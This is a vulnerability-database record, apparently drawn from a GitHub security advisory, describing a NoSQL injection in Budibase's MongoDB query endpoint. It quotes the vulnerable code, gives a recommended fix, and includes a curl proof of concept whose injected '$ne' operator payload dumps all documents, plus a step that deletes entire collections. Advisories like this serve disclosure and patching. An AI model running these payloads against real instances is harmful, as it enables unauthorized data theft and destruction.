@@ -1,0 +1,158 @@
+[basic]
+description = '''
+## Summary
+
+Budibase's MongoDB query execution endpoint (`POST /api/v2/queries/:queryId`) is vulnerable to NoSQL injection through user-supplied query parameters. The `enrichContext()` function interpolates parameter values into JSON query templates using Handlebars with `noEscaping: true`, then parses the result with `JSON.parse()`. An attacker can inject JSON metacharacters (`\"`, `{`, `}`) into parameter values to alter the structure of MongoDB queries, bypassing intended filters to read, modify, or delete arbitrary documents.
+
+## Details
+
+The vulnerability exists because input validation and interpolation are misaligned. The `validateQueryInputs()` function blocks Handlebars template syntax (`{{}}`) but does not sanitize JSON structural characters:
+
+**packages/server/src/api/controllers/query/index.ts:57-69**
+```typescript
+function validateQueryInputs(parameters: QueryEventParameters) {
+  for (let entry of Object.entries(parameters)) {
+    const [key, value] = entry
+    if (typeof value !== \"string\") {
+      continue
+    }
+    if (findHBSBlocks(value).length !== 0) {
+      throw new Error(
+        `Parameter '${key}' input contains a handlebars binding - this is not allowed.`
+      )
+    }
+  }
+}
+```
+
+After validation passes, `enrichContext()` performs raw string interpolation with escaping explicitly disabled:
+
+**packages/server/src/sdk/workspace/queries/queries.ts:105-108**
+```typescript
+enrichedQuery[key] = processStringSync(fields[key], parameters, {
+  noEscaping: true,
+  noHelpers: true,
+  escapeNewlines: true,
+})
+```
+
+The interpolated string is then parsed as JSON at line 122:
+
+**packages/server/src/sdk/workspace/queries/queries.ts:122**
+```typescript
+enrichedQuery.json = JSON.parse(
+  enrichedQuery.json ||
+  enrichedQuery.customData ||
+  enrichedQuery.requestBody
+)
+```
+
+The parsed object flows directly into MongoDB driver calls with no further sanitization:
+
+**packages/server/src/integrations/mongodb.ts:509**
+```typescript
+return await collection.find(json).toArray()
+```
+
+**packages/server/src/integrations/mongodb.ts:624**
+```typescript
+return await collection.deleteMany(json.filter, json.options)
+```
+
+Consider a saved query with a JSON template like `{\"username\": \"{{username}}\"}`. If an attacker provides the parameter value `\", \"$ne\": \"` the interpolated string becomes `{\"username\": \"\", \"$ne\": \"\"}` — a valid JSON object that matches all documents where `username` is not empty, instead of matching a single specific user.
+
+The route requires only `PermissionType.QUERY, PermissionLevel.WRITE` (packages/server/src/api/routes/query.ts:27), which is available to regular app users — not restricted to builders or admins. Critically, the execute endpoint has no Joi schema validation on the request body, unlike the save and preview endpoints.
+
+## PoC
+
+**Prerequisites:** A Budibase instance with a MongoDB datasource and a saved query that accepts a parameter interpolated into the query JSON (e.g., a `find` query with `{\"username\": \"{{username}}\"}`).
+
+**Step 1: Authenticate as a regular app user**
+```bash
+TOKEN=$(curl -s -X POST http://localhost:10000/api/global/auth \
+  -H \"Content-Type: application/json\" \
+  -d '{\"username\":\"appuser@example.com\",\"password\":\"password\"}' \
+  -c - | grep budibase:auth | awk '{print $NF}')
+```
+
+**Step 2: Execute the query normally (returns only matching document)**
+```bash
+curl -s -X POST http://localhost:10000/api/v2/queries/query_abc123 \
+  -H \"Content-Type: application/json\" \
+  -b \"budibase:auth=$TOKEN\" \
+  -d '{\"parameters\": {\"username\": \"alice\"}}'
+# Returns: [{\"username\": \"alice\", ...}]
+```
+
+**Step 3: Inject NoSQL operator to dump all documents**
+```bash
+curl -s -X POST http://localhost:10000/api/v2/queries/query_abc123 \
+  -H \"Content-Type: application/json\" \
+  -b \"budibase:auth=$TOKEN\" \
+  -d '{\"parameters\": {\"username\": \"\\", \\"$ne\\": \\"\"}}'
+# Returns: [{\"username\": \"alice\", ...}, {\"username\": \"bob\", ...}, {\"username\": \"admin\", ...}, ...]
+```
+
+The injected value `\", \"$ne\": \"` transforms the query from `{\"username\": \"alice\"}` to `{\"username\": \"\", \"$ne\": \"\"}`, which matches all documents where username is not empty.
+
+**Step 4: Delete all documents via a delete query (if a delete-type query is saved)**
+```bash
+curl -s -X POST http://localhost:10000/api/v2/queries/query_del456 \
+  -H \"Content-Type: application/json\" \
+  -b \"budibase:auth=$TOKEN\" \
+  -d '{\"parameters\": {\"username\": \"\\", \\"$ne\\": \\"\"}}'
+# Deletes ALL documents matching the injected filter
+```
+
+## Impact
+
+- **Data exfiltration:** Any app user with query write permission can bypass intended query filters to read all documents in a MongoDB collection, including sensitive data belonging to other users or tenants.
+- **Data modification:** Through `updateMany` queries, attackers can modify arbitrary documents in bulk by injecting broadened filters.
+- **Data destruction:** Through `deleteMany` queries, attackers can delete all documents matching an injected filter, potentially wiping entire collections.
+- **Authorization bypass:** The attack requires only `QUERY WRITE` permission, which is a standard app-level permission — not builder or admin access. This means any regular application user can exploit saved MongoDB queries they have access to execute.
+
+## Recommended Fix
+
+Sanitize parameter values before interpolation by escaping JSON metacharacters. Apply this in `enrichContext()` before the `processStringSync` call:
+
+**packages/server/src/sdk/workspace/queries/queries.ts**
+```typescript
+// Add this helper function
+function escapeJsonValue(value: string): string {
+  return value.replace(/\\/g, \"\\\\\").replace(/\"/g, '\\\"')
+}
+
+// In enrichContext(), sanitize parameters before interpolation
+for (const [key, value] of Object.entries(parameters)) {
+  if (typeof value === \"string\") {
+    parameters[key] = escapeJsonValue(value)
+  }
+}
+```
+
+Alternatively, adopt a parameterized query approach: instead of string interpolation into JSON, parse the template JSON first and then inject parameter values into the parsed object at the value level, preventing any structural modification of the query.
+
+Additionally, add Joi validation to the execute endpoint (`POST /api/v2/queries/:queryId`) to constrain the shape of incoming parameter values, consistent with the validation already present on the save and preview endpoints.
+'''
+published = ""
+remediation = "请参考官方安全公告，及时安装安全更新或升级到最新版本。"
+score = 5
+severity = "MEDIUM"
+sources = ["ghsa"]
+title = "Budibase: NoSQL Injection via JSON Parameter Interpolation in MongoDB Query Execution"
+updated = ""
+
+[exploit]
+exp_urls = []
+poc_urls = []
+
+[id]
+aliases = ["GHSA-qw6m-8fw2-2v64"]
+ave_id = "AVE-2026-1194"
+
+[meta]
+collected_at = "2026-08-06T11:54:57.444004912+00:00"
+status = "completed"
+
+[references]
+urls = []
